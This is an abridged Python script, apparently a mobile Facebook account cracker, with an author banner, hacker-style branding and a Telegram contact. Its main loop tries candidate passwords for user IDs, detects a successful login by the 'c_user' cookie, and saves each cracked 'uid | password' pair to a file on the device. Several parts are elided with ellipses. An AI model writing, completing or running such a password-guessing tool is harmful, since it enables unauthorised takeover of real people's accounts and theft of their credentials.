#created by KM EYASIN 
#team name hbf
#tottaly written by KM 360 EYASIN 
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; EYASIN \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER    \033[1;31m    ➟   \033[1;32m꧁𓊈𒆜 E Y A S I N 𒆜𓊉꧂      \033[1;31m      ‌‌‌‌‌‌‌
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m ➟   \033[1;32m   EYASIN 420      \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mTELEGRAM   \033[1;31m ➟  \033[1;32m    t.me/bothacker999    \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m   ➟   \033[1;32m    EYASIN 420   \033[1;31m   
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/EYASIN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[EYASIN 🔥] [%s] \33[1;97m[OK:%s{EYASIN 2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
